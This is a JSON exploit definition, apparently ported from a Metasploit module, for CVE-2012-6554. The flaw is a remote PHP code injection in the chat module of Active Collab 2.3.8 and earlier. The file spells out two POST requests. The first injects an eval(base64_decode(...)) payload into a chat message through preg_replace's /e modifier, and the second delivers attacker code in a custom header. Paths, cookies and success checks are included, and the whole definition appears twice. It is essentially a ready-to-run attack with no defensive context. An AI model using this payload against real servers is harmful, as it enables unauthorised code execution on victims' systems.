{
   "informations" : {
      "PAYLOAD" : "login[email]=__LOGIN[EMAIL]__&login[password]=__LOGIN[PASSWORD]__&submitted=submitted&submitted=submitted&message[message_text]=__MESSAGE[MESSAGE_TEXT]__&message[chat_id]=1&message[posted_to_user_id]=all&",
      "name" : "ActivecollabChat",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "PATH" : "index.php",
            "METHOD" : "POST",
            "TEXT" : "Sending Exploit #1 Request : [POST] /index.php",
            "PAYLOAD" : "submitted=submitted&message%5bmessage_text%5d=%3cth%3e%22%29%3b%7b%24%7beval%28base64_decode%28%24_SERVER%5bHTTP_KCE%5d%29%29%7d%7d%3c/th%3e&message%5bchat_id%5d=1&message%5bposted_to_user_id%5d=all",
            "HEADERS" : {
               "cookie" : "ac_ActiveCollab_sid_eaM4h3LTIZ=",
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         },
         "EXPLOIT2" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /public/index.php",
            "HEADERS" : {
               "cookie" : "ac_ActiveCollab_sid_eaM4h3LTIZ=",
               "KCE" : "X19QQVlMT0FEX18=",
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "",
            "METHOD" : "POST",
            "PATH" : "public/index.php"
         }
      },
      "OSVDB" : 81966,
      "DESCRIPTION" : "\n\n        This module exploits an arbitrary code injection vulnerability in the\n\n        chat module that is part of Active Collab versions 2.3.8 and earlier by\n\n        abusing a preg_replace() using the /e modifier and its replacement\n\n        string using double quotes. The vulnerable function can be found in\n\n        activecollab/application/modules/chat/functions/html_to_text.php.\n\n      ",
      "TITLE" : "Active Collab \"chat module\" Remote PHP Code Injection Exploit",
      "CVE" : "CVE-2012-6554",
      "MSF_MODULE" : "activecollab_chat",
      "VARIABLES" : {
         "LOGIN[PASSWORD]" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "MESSAGE[MESSAGE_TEXT]" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "LOGIN[EMAIL]" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "URI" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         }
      },
      "TYPE" : "MSF",
      "PLATFORM" : "MULTI",
      "REFERENCES" : [
         "http://www.activecollab.com/downloads/category/4/package/62/releases"
      ],
      "METHOD" : "POST"
   },
   "detection" : {},
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "type" : "MSF",
   "osvdb" : 81966,
   "requests" : {
      "EXPLOIT2" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /public/index.php",
         "HEADERS" : {
            "cookie" : "ac_ActiveCollab_sid_eaM4h3LTIZ=",
            "KCE" : "X19QQVlMT0FEX18=",
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "",
         "METHOD" : "POST",
         "PATH" : "public/index.php"
      },
      "EXPLOIT1" : {
         "PATH" : "index.php",
         "METHOD" : "POST",
         "TEXT" : "Sending Exploit #1 Request : [POST] /index.php",
         "PAYLOAD" : "submitted=submitted&message%5bmessage_text%5d=%3cth%3e%22%29%3b%7b%24%7beval%28base64_decode%28%24_SERVER%5bHTTP_KCE%5d%29%29%7d%7d%3c/th%3e&message%5bchat_id%5d=1&message%5bposted_to_user_id%5d=all",
         "HEADERS" : {
            "cookie" : "ac_ActiveCollab_sid_eaM4h3LTIZ=",
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      }
   },
   "references" : [
      "http://www.activecollab.com/downloads/category/4/package/62/releases"
   ],
   "msf_module" : "activecollab_chat",
   "name" : "ActivecollabChat",
   "cve" : "CVE-2012-6554",
   "payload" : "login[email]=__LOGIN[EMAIL]__&login[password]=__LOGIN[PASSWORD]__&submitted=submitted&submitted=submitted&message[message_text]=__MESSAGE[MESSAGE_TEXT]__&message[chat_id]=1&message[posted_to_user_id]=all&",
   "title" : "Active Collab \"chat module\" Remote PHP Code Injection Exploit",
   "variables" : {
      "MESSAGE[MESSAGE_TEXT]" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "LOGIN[PASSWORD]" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "LOGIN[EMAIL]" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "URI" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      }
   },
   "description" : "\n\n        This module exploits an arbitrary code injection vulnerability in the\n\n        chat module that is part of Active Collab versions 2.3.8 and earlier by\n\n        abusing a preg_replace() using the /e modifier and its replacement\n\n        string using double quotes. The vulnerable function can be found in\n\n        activecollab/application/modules/chat/functions/html_to_text.php.\n\n      ",
   "method" : "POST",
   "platform" : "MULTI"
}
